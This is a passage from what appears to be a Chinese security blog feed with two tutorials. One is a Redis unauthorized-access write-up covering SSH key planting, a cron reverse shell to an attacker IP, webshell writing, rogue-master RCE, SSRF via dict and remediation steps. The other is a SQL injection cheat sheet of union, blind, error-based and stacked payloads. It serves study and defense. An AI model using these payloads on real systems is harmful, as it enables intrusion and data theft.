xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hacker      get xz                              # 获取键xz的内容      SET score 857                       # 设置键score的值为857      INCR score                          # 使用INCR命令将score的值增加1      GET score                           # 获取键score的内容      keys *                              # 列出当前数据库中所有的键      config set protected-mode no       # 关闭安全模式      get anotherkey                      # 获取一个不存在的键的值      config set dir /root/redis          # 设置保存目录      config set dbfilename redis.rdb     # 设置保存文件名      config get dir                      # 查看保存目录      config get dbfilename               # 查看保存文件名      save                                # 进行一次备份操作      flushall                            # 删除所有数据      del key                             # 删除键为key的数据      slaveof ip port                 # 设置主从关系      redis-cli -h ip -p 6379 -a passwd   # 外部连接</code></pre><h2 id="Redis基本操作"><a href="#Redis基本操作" class="headerlink" title="Redis基本操作"></a>Redis基本操作</h2><pre><code>1.使用SET和GET命令，可以完成基本的赋值和取值操作；2.Redis是不区分命令的大小写的，set和SET是同一个意思；3.使用keys *可以列出当前数据库中的所有键；4.当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；5.如果键的值中有空格，需要使用双引号括起来，如&quot;Hello World&quot;；</code></pre><h2 id="Redis配置文件参数："><a href="#Redis配置文件参数：" class="headerlink" title="Redis配置文件参数："></a>Redis配置文件参数：</h2><p>执行命令：ps aux | grep redis搜索redis配置文件位置</p><ul><li><p>port参数</p><p>格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。</p></li><li><p>bind参数</p><p>格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.1.100 10.0.0.1，表允许192.168.1.100和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，说白了就是白名单。</p></li><li><p>save参数</p><p>格式为save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：</p><p>save 900 1</p><p>save 300 10</p><p>save 60 10000</p><p>表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。</p></li><li><p>requirepass参数</p><p>格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。</p></li><li><p>dir参数</p><p>格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。</p></li><li><p>dbfilename参数</p><p>格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。</p></li><li><p>config命令</p><p>通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。</p></li><li><p>protected-mode参数</p><p>安全模式，高版本默认为yes</p></li></ul><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p><ul><li>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照</li><li>AOF 持久化记录服务器执行的所有写操作命令.</li></ul><p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p><ul><li>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</li></ul><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>靶机：unbantu 16</p><pre><code>为快速复现，默认apt-get安装先进行更新sudo apt-get upgrade安装sudo apt-get install redis-server默认安装到 /usr/bin/redis-server直接启动服务就可以执行redis-server或者redis-server （配置文件目录）注意要将配置文件中的bind参数改为0.0.0.0，允许外连。还需要关闭防火墙，具体命令：sudo ufw disable  查看防火墙状态：sudo ufw status  </code></pre><p>配置文件修改：</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/2.jpg"></p><p>开启服务</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/1.jpg"></p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="1、写-ssh-keygen-公钥登录服务器"><a href="#1、写-ssh-keygen-公钥登录服务器" class="headerlink" title="1、写 ssh-keygen 公钥登录服务器"></a>1、写 ssh-keygen 公钥登录服务器</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>SSH免密登录的原理：</p><p>SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。</p><p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是可以公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p><blockquote><p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端； （2）客户端发起登录请求，发送自己的相关信息； （3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录，若有则生成一段随机数使用该公钥加密后发送给客户端； （4）客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证； （5）服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对，若一样则允许登录，不一样则拒绝登录。</p></blockquote><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h4><p>1、Redis服务使用ROOT账号启动</p><p>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p><h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>1.在攻击机本地生成公钥文件：</p><p>需要为我们的公钥文件设置一个私钥</p><p>公钥文件默认路径：/root/.ssh/id_rsa.pub</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/3.jpg"></p><pre><code>具体命令：ssh-keygen -t rsacd /root/.sshlscat id_rsa.pub</code></pre><p>然后通过未授权访问目标机</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/4.jpg"></p><p>具体命令</p><pre><code>redis-cli -h 192.168.33.134        #连接目标主机redisconfig get dir                  #检查当前工作目录config get dbfilename              #检查备份文件名config set dir /root/.ssh/         #设置工作目录config set dbfilename authorized_keys #设置备份文件名set xz &quot;\n\n\n 公钥 \n\n\n&quot;         #将公钥写入xz健save                         #进行备份     </code></pre><p>利用公钥进行SSH登录攻击机</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/5.jpg"></p><h3 id="2、利用计划任务反弹shell"><a href="#2、利用计划任务反弹shell" class="headerlink" title="2、利用计划任务反弹shell"></a>2、利用计划任务反弹shell</h3><h4 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h4><p>我们都知道crontab是做计划任务的，启动的任务存放在/var/spool/cron中，root可以修改计划任务，可以将执行命令反弹shell直接写入计划任务中</p><h4 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h4><p>root启用Redis</p><h4 id="详细步骤：-1"><a href="#详细步骤：-1" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>先在攻击机使用nc监听8888端口<code>nc -lvp 8888</code></p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/8.jpg"></p><p>然后去操作Redis，具体命令：</p><pre><code>redis-cli -h 192.168.33.134            #连接redis flushall                           #清除所有键值config set dir /var/spool/cron/crontabs/  #设置工作目录  config set dbfilename shell               #备份名称set xz &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.33.131/8888 0&gt;&amp;1\n&quot;     #将反弹shell写入xz键值save                             #写入工作目录的shell文件</code></pre><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/9.jpg"></p><p>看监听的命令行窗口已经有弹回来的shell了（这里有很多的坑，写入会出现乱码和不回弹的情况，最好还是用centos测试吧）</p><p>ubantu的坑参考这个<a href="https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/">https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/</a></p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/10.jpg"></p><h3 id="3、Redis直接写webshell"><a href="#3、Redis直接写webshell" class="headerlink" title="3、Redis直接写webshell"></a>3、Redis直接写webshell</h3><h4 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h4><p>知道网站绝对路径，并且需要增删改查权限</p><p>补充：若不知道物理路径，可尝试寻找网站的应用程序错误或者常见绝对路径去尝试。</p><h4 id="详细步骤"><a href="#详细步骤" class="headerlink" title="详细步骤"></a>详细步骤</h4><pre><code>redis-cli -h 192.168.3.134     #连接Redisconfig set dir /www/admin/localhost_80/wwwroot    #设置要写入shell的路径set xxx &quot;\n\n\n&lt;?php phpinfo() ;?&gt;\n\n\n&quot; config set dbfilename phpinfo.php save</code></pre><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/11.jpg"></p><p>成功写入</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/12.jpg"></p><h3 id="4、Redis主从复制getshell"><a href="#4、Redis主从复制getshell" class="headerlink" title="4、Redis主从复制getshell"></a>4、Redis主从复制getshell</h3><h4 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h4><p>​     Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>​  在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h4 id="条件：-3"><a href="#条件：-3" class="headerlink" title="条件："></a>条件：</h4><p>Redis 版本(4.x~5.0.5)（新增模块功能，通过C语言并编译出恶意.so文件）</p><h4 id="详细步骤：-2"><a href="#详细步骤：-2" class="headerlink" title="详细步骤："></a>详细步骤：</h4><p>模拟主从关系</p><pre><code>root@kali:~/桌面# redis-cli -h 192.168.33.134192.168.33.134:6379&gt; slaveof 192.168.33.131 6379OK192.168.33.134:6379&gt; get xz(nil)192.168.33.134:6379&gt; exitroot@kali:~/桌面# redis-cli127.0.0.1:6379&gt; get xz(nil)127.0.0.1:6379&gt; set xz xzOK127.0.0.1:6379&gt; exitroot@kali:~/桌面# redis-cli -h 192.168.33.134192.168.33.134:6379&gt; get xz&quot;xz&quot;192.168.33.134:6379&gt; </code></pre><p>在Kali和目标机都需要关闭redis.conf的保护模式（改为protected-mode no）</p><p>设置主从关系</p><pre><code>root@kali:~/桌面# redis-cli -h 192.168.33.134192.168.33.134:6379&gt; slaveof 192.168.33.131 6379OK</code></pre><p>在kali下载利用工具</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">下载地址</a>可直接用git clone</p><p>下载之后cd进入RedisModulesSDK目录使用make编译，当然不想编译也可以用作者给出的默认exp.so也是可以的</p><p>有两种使用方法</p><p>一种是交互式shell,另一种是反弹shell</p><p>交互shell演示：</p><pre><code>python3 redis-rogue-server.py --rhost 192.168.33.134 --lhost 192.168.33.131 --exp module.so根据提示输入i进入交互shell</code></pre><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/16.jpg"></p><p>反弹shell</p><pre><code>python3 redis-rogue-server.py --rhost 192.168.33.134 --lhost 192.168.33.131 --exp module.so根据提示输入r，接着输入ip和端口进行反弹</code></pre><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/15.jpg"></p><p>ps：redis主从RCE打多了会出现redis瘫痪的情况，所以不到万不得已，尽量不要打主从</p><h3 id="5、结合SSRF进行利用"><a href="#5、结合SSRF进行利用" class="headerlink" title="5、结合SSRF进行利用"></a>5、结合SSRF进行利用</h3><p>原理：利用dict协议</p><p>条件：root启用redis</p><p>使用pikachu的靶场，，gopher目前比较少见，这里采用dict协议，目标机需要安装dict协议</p><p>详细步骤：</p><pre><code>dict://192.168.33.134:6379/set:xz:xzdict://192.168.33.134:6379/config:set:dir:/www/wwwroot/dict://192.168.33.134:6379/config:set:dbfilename:xz.php   #直接写入&lt;&gt;会被实体编码，？直接被截断#采用主从复制写入dict://192.168.33.134:6379/slaveof:192.168.133.131:6379#登入kali写shell#方法和上面的一样，看别人文章，在web开启主从是可以的，但是我不知什么原因连接失败</code></pre><p>失败截图：</p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/18.jpg"></p><p><img src="/2020/06/20/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/17.jpg"></p><h3 id="6、redis写lua"><a href="#6、redis写lua" class="headerlink" title="6、redis写lua"></a>6、redis写lua</h3><p>redis2.6之前内置了lua脚本环境在redis未授权的情况下可以利用lua执行系统命令</p><p>参考文章：<a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p><h1 id="批量检测未授权redis脚本"><a href="#批量检测未授权redis脚本" class="headerlink" title="批量检测未授权redis脚本"></a>批量检测未授权redis脚本</h1><p><a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p><h1 id="redis未授权漏洞应急响应案例："><a href="#redis未授权漏洞应急响应案例：" class="headerlink" title="redis未授权漏洞应急响应案例："></a>redis未授权漏洞应急响应案例：</h1><p>redis未授权访问致远程植入挖矿脚本（防御篇）</p><p><a href="https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w">https://mp.weixin.qq.com/s/eUTZsGUGSO0AeBUaxq4Q2w</a></p><h1 id="利用拓展："><a href="#利用拓展：" class="headerlink" title="利用拓展："></a>利用拓展：</h1><p>Windows下如何getshell？</p><pre><code>写入webshell，需要知道web路径写入启动项，需要目标服务器重启写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。</code></pre><h1 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h1><h4 id="1、禁止一些高危命令（重启redis才能生效"><a href="#1、禁止一些高危命令（重启redis才能生效" class="headerlink" title="1、禁止一些高危命令（重启redis才能生效)"></a>1、禁止一些高危命令（重启redis才能生效)</h4><ul><li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li></ul><pre><code>rename-command FLUSHALL &quot;&quot;rename-command CONFIG &quot;&quot;rename-command EVAL &quot;&quot;</code></pre><ul><li>或者通过修改redis.conf文件，改变这些高危命令的名称</li></ul><pre><code>rename-command FLUSHALL &quot;name1&quot;rename-command CONFIG &quot;name2&quot;rename-command EVAL &quot;name3&quot;</code></pre><h4 id="2、以低权限运行-Redis-服务（重启redis才能生效）"><a href="#2、以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="2、以低权限运行 Redis 服务（重启redis才能生效）"></a>2、以低权限运行 Redis 服务（重启redis才能生效）</h4><p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><pre><code>groupadd -r redis &amp;&amp; useradd -r -g redis redis</code></pre><h4 id="3、为-Redis-添加密码验证（重启redis才能生效）"><a href="#3、为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="3、为 Redis 添加密码验证（重启redis才能生效）"></a>3、为 Redis 添加密码验证（重启redis才能生效）</h4><p>修改 redis.conf 文件，添加</p><pre><code>requirepass mypassword（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</code></pre><h4 id="4、禁止外网访问-Redis（重启redis才能生效）"><a href="#4、禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="4、禁止外网访问 Redis（重启redis才能生效）"></a>4、禁止外网访问 Redis（重启redis才能生效）</h4><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p><pre><code>bind 127.0.0.1</code></pre><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p><h4 id="5、修改默认端口"><a href="#5、修改默认端口" class="headerlink" title="5、修改默认端口"></a>5、修改默认端口</h4><p>修改配置文件redis.conf文件</p><pre><code>Port 6379</code></pre><p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p><h4 id="6、保证-authorized-keys-文件的安全"><a href="#6、保证-authorized-keys-文件的安全" class="headerlink" title="6、保证 authorized_keys 文件的安全"></a>6、保证 authorized_keys 文件的安全</h4><p>为了保证安全，您应该阻止其他用户添加新的公钥。</p><ul><li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li></ul><pre><code>chmod 400 ~/.ssh/authorized_keys</code></pre><ul><li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li></ul><pre><code>chattr +i ~/.ssh/authorized_keys</code></pre><ul><li>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 权限：</li></ul><pre><code>chattr +i ~/.ssh</code></pre><h4 id="7、设置防火墙策略"><a href="#7、设置防火墙策略" class="headerlink" title="7、设置防火墙策略"></a>7、设置防火墙策略</h4><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL基础知识总结</title>
      <link href="/2020/05/12/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/05/12/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a><strong>0x01 什么是SQL注入</strong></h2><p>sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。</p><h2 id="0x02-SQL注入的分类"><a href="#0x02-SQL注入的分类" class="headerlink" title="0x02 SQL注入的分类"></a>0x02 SQL注入的分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul><li>数字型</li><li>字符型</li></ul><h3 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h3><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li></ul><h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul><li><p>报错注入</p></li><li><p>盲注</p></li><li><ul><li>布尔盲注</li><li>时间盲注</li></ul></li><li><p>union注入</p></li></ul><h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul><li>宽字节注入</li></ul><h2 id="0x03识别后台数据库"><a href="#0x03识别后台数据库" class="headerlink" title="0x03识别后台数据库"></a>0x03识别后台数据库</h2><h3 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a>根据操作系统平台</h3><p><strong>sql server</strong>：Windows（IIS)</p><p><strong>MySQL</strong>：Apache</p><h3 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a>根据web语言</h3><p><strong>Microsoft SQL Server</strong>：ASP和.Net</p><p><strong>MySQL</strong>：PHP</p><p><strong>Oracle/MySQL</strong>：java</p><p>(以下是对mysql数据库的总结，其他类型数据库会不定时更新)</p><h2 id="0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别"><a href="#0x04-MySQL-5-0以上和MySQL-5-0以下版本的区别" class="headerlink" title="0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别"></a>0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别</h2><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–<strong>INFORMATION_SCHEMA</strong> ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而5.0以下没有。</p><p><strong>information_schema</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong>TABLES</strong></p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><h2 id="0x05-基本手工注入流程"><a href="#0x05-基本手工注入流程" class="headerlink" title="0x05 基本手工注入流程"></a>0x05 基本手工注入流程</h2><p>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p><h3 id="1-MySQL-gt-5-0"><a href="#1-MySQL-gt-5-0" class="headerlink" title="1. MySQL &gt;= 5.0"></a>1. MySQL &gt;= 5.0</h3><h3 id="（1）获取字段数"><a href="#（1）获取字段数" class="headerlink" title="（1）获取字段数"></a>（1）获取字段数</h3><pre><code>order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/</code></pre><h3 id="（2）获取系统数据库名"><a href="#（2）获取系统数据库名" class="headerlink" title="（2）获取系统数据库名"></a>（2）获取系统数据库名</h3><p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p><pre><code class="mysql">select null,null,schema_name from information_schema.schemata</code></pre><h3 id="（3）获取当前数据库名"><a href="#（3）获取当前数据库名" class="headerlink" title="（3）获取当前数据库名"></a>（3）获取当前数据库名</h3><pre><code class="mysql">select null,null,...,database()</code></pre><h3 id="（4）获取数据库中的表"><a href="#（4）获取数据库中的表" class="headerlink" title="（4）获取数据库中的表"></a>（4）获取数据库中的表</h3><pre><code class="mysql">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><p>或</p><pre><code class="mysql">select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1</code></pre><h3 id="（5）获取表中的字段"><a href="#（5）获取表中的字段" class="headerlink" title="（5）获取表中的字段"></a>（5）获取表中的字段</h3><p>这里假设已经获取到表名为user</p><pre><code class="mysql">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code></pre><h3 id="（6）获取各个字段值"><a href="#（6）获取各个字段值" class="headerlink" title="（6）获取各个字段值"></a>（6）获取各个字段值</h3><p>这里假设已经获取到表名为user，且字段为username和password</p><pre><code class="mysql">select null,group_concat(username,password) from users</code></pre><h3 id="2-MySQL-lt-5-0"><a href="#2-MySQL-lt-5-0" class="headerlink" title="2.MySQL &lt; 5.0"></a>2.MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工枚举爆破（二分法思想）。</p><p>该方式通常用于盲注。</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><pre><code class="mysql">and ascii(substr((select database()),1,1))&gt;64 /*判断数据库名的第一个字符的ascii值是否大于64*/</code></pre><h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><pre><code class="mysql">id=1 union select if(SUBSTRING(user(),1,4)=&#39;root&#39;,sleep(4),1),null,null /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/</code></pre><h2 id="0x06-常用注入方式"><a href="#0x06-常用注入方式" class="headerlink" title="0x06 常用注入方式"></a>0x06 常用注入方式</h2><p>注释符：</p><pre><code class="mysql">#-- (有空格)或--+/**/</code></pre><p>内联注释：</p><pre><code class="mysql">/*！...*/</code></pre><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><pre><code class="mysql">id =-1 union select 1,2,3   /*获取字段*/</code></pre><h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><pre><code class="mysql">id=1&#39; substr(database(),1,1)=&#39;t&#39;--+     /*判断数据名长度*/</code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="1-floor-和rand"><a href="#1-floor-和rand" class="headerlink" title="1 floor()和rand()"></a>1 floor()和rand()</h4><pre><code class="mysql">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</code></pre><h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2 extractvalue()"></a>2 extractvalue()</h4><pre><code class="mysql">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></pre><h4 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3 updatexml()"></a>3 updatexml()</h4><pre><code class="mysql">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre><h4 id="4-geometrycollection"><a href="#4-geometrycollection" class="headerlink" title="4 geometrycollection()"></a>4 geometrycollection()</h4><pre><code class="mysql">id=1 and geometrycollection((select * from(select * from(select user())a)b))</code></pre><h4 id="5-multipoint"><a href="#5-multipoint" class="headerlink" title="5 multipoint()"></a>5 multipoint()</h4><pre><code class="mysql">id=1 and multipoint((select * from(select * from(select user())a)b))</code></pre><h4 id="6-polygon"><a href="#6-polygon" class="headerlink" title="6 polygon()"></a>6 polygon()</h4><pre><code class="mysql">id=1 and polygon((select * from(select * from(select user())a)b))</code></pre><h4 id="7-multipolygon"><a href="#7-multipolygon" class="headerlink" title="7 multipolygon()"></a>7 multipolygon()</h4><pre><code class="mysql">id=1 and multipolygon((select * from(select * from(select user())a)b))</code></pre><h4 id="8-linestring"><a href="#8-linestring" class="headerlink" title="8 linestring()"></a>8 linestring()</h4><pre><code class="mysql">id=1 and linestring((select * from(select * from(select user())a)b))</code></pre><h4 id="9-multilinestring"><a href="#9-multilinestring" class="headerlink" title="9 multilinestring()"></a>9 multilinestring()</h4><pre><code class="mysql">id=1 and multilinestring((select * from(select * from(select user())a)b))</code></pre><h4 id="10-exp"><a href="#10-exp" class="headerlink" title="10 exp()"></a>10 exp()</h4><pre><code class="mysql">id=1 and exp(~(select * from(select user())a))</code></pre><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><pre><code class="mysql">id = 1 and if(length(database())&gt;1,sleep(5),1)</code></pre><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><pre><code class="mysql">id = 1&#39;;select if(sub(user(),1,1)=&#39;r&#39;,sleep(3),1)%23</code></pre><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test’，接下来访问xxx.php?username=test’，页面返回id=22；</p><p>接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。</p><p>访问xxx.php?id=test’ union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li><input disabled type="checkbox"> 查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数</li><li><input disabled type="checkbox"> 数据库的编码为GBK</li></ul><h4 id="利用方式"><a 